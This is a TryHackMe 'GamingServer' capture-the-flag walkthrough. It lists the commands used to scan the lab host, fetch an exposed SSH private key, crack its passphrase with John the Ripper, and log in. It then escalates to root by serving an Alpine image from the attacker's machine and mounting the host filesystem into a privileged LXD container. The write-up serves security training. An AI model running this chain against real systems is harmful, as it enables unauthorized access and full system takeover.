---
description: https://tryhackme.com/room/gamingserver
---

# GamingServer

## :writing\_hand: Solution

### What is the user flag?

```
nmap 10.10.184.26

```

![](<../../.gitbook/assets/Screenshot from 2020-09-29 08-36-54.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-29 08-39-39.png>)

```
gobuster dir -u http://10.10.184.26 \
             -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t64
```

![](<../../.gitbook/assets/Screenshot from 2020-09-29 09-24-01.png>)

```
wget http://10.10.184.26/uploads/dict.lst
wget http://10.10.184.26/secret/secretKey
chmod 600 secretKey
```

![](<../../.gitbook/assets/Screenshot from 2020-09-29 08-40-28.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-29 08-40-11.png>)

```
/usr/share/john/ssh2john.py secretKey > ssh.txt
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-29 08-48-40.png>)

```
ssh -i secretKey john@10.10.184.26
$ ls -A
$ cat user.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-29 08-50-18.png>)

### What is the root flag?

#### Kali

```
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder/
./build-alpine -a i686
python3 http.server
```

#### Host

```
wget http://10.9.101.193:8000/alpine-v3.12-i686-20200929_0907.tar.gz
lxc image import ./alpine-v3.12-i686-20200929_0907.tar.gz --alias myimage
lxc image list
```

![](<../../.gitbook/assets/Screenshot from 2020-09-29 09-11-15.png>)

```
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
~ # cat /mnt/root/root/root.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-29 09-16-29.png>)

## :link: Support Material

{% embed url="https://www.hackingarticles.in/lxd-privilege-escalation/" %}

{% embed url="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation" %}
